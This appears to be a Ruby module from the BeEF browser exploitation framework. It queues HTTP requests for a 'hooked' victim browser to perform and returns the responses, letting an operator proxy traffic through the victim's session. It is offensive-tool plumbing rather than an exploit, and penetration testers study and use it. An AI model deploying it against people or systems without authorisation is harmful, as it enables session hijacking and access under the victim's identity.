module BeEF
module Extension
module Proxy
module Handlers
module Zombie
 
  module Handler
    
    # Variable representing the Http DB model.
    H = BeEF::Core::Models::Http
    # This function will forward requests to the target and 
    # the browser will perform the request. Then the results
    # will be sent back to use
    def forward_request(hooked_browser_id, req, res)

      # Generate a id for the req in the http table and check it doesnt already exist
      http_id = rand(10000)
      http_db = H.first(:id => http_id) || nil
      
      while !http_db.nil?
        http_id = rand(10000)
        http_db = H.first(:id => http_id) || nil
      end

      # Saves the new HTTP request to the db for processing by browser
      http = H.new(
        :id => http_id,
        :request => req,
        :method => req.request_method.to_s,
        :domain => req.host.to_s,
        :path => req.path.to_s,
        :date => Time.now,
        :hooked_browser_id => hooked_browser_id
      )
      http.save

      print_debug "[PROXY] Request #" + http_id.to_s + " to " + req.host.to_s + req.path.to_s + " added to queue for browser id #" + hooked_browser_id.to_s
      
      # Polls the DB for the response and then sets it when present
      http_db = H.first(:id => http_id)

      while !http_db.has_ran
        http_db = H.first(:id => http_id)
      end
      
      print_debug "[PROXY] Response to request #" + http_id.to_s + " to " + req.host.to_s + req.path.to_s + " using browser id #" + hooked_browser_id.to_s + " recieved"
      
      res.body = http_db.response

      res

    end

    module_function :forward_request
    
  end

end
end
end
end
end